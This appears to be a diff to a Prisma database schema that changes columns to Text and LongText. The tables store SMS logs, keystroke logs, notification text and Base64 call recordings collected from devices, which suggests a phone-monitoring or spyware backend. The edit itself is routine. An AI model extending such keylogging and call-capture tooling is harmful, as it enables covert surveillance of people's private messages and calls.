@@ -46,7 +46,7 @@ model SmsLog {
   deviceId  String
   device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
   address   String   // Phone number
-  body      String
+  body      String   @db.Text // SMS can be long, use TEXT type
   type      String   // "incoming" or "outgoing"
   timestamp DateTime
   syncedAt  DateTime @default(now())
@@ -105,7 +105,7 @@ model Keylog {
   device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
   app       String?  // App package where text was typed
   appName   String?  // Friendly app name
-  text      String
+  text      String   @db.Text // Keylog text can be very long
   timestamp DateTime
   syncedAt  DateTime @default(now())
 
@@ -135,8 +135,8 @@ model NotificationLog {
   device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
   app       String   // Package name
   appName   String?  // Friendly name
-  title     String?
-  text      String?
+  title     String?  @db.Text // Title can be long
+  text      String?  @db.Text // Notification text can be very long
   timestamp DateTime
   syncedAt  DateTime @default(now())
 
@@ -194,10 +194,10 @@ model CallRecording {
   callType     String   // "incoming" or "outgoing"
   duration     Int      // seconds
   status       String   @default("uploaded") // "recording", "pending", "uploaded", "error"
-  audioData    String?  // Base64 encoded audio content (BigInt/Blob would be better but string is more flexible for SQLite/JSON)
+  audioData    String?  @db.LongText // Base64 encoded audio - MUST be LongText for large files
   fileName     String?  // Original filename
   mimeType     String?  @default("audio/mpeg")
-  fileUrl      String?  // URL to download recording (can be data URI or server proxy)
+  fileUrl      String?  @db.Text // URL can be long (data URI)
   filePath     String?  // Server storage path
   fileSize     Int?     // bytes
   recordedAt   DateTime @default(now())
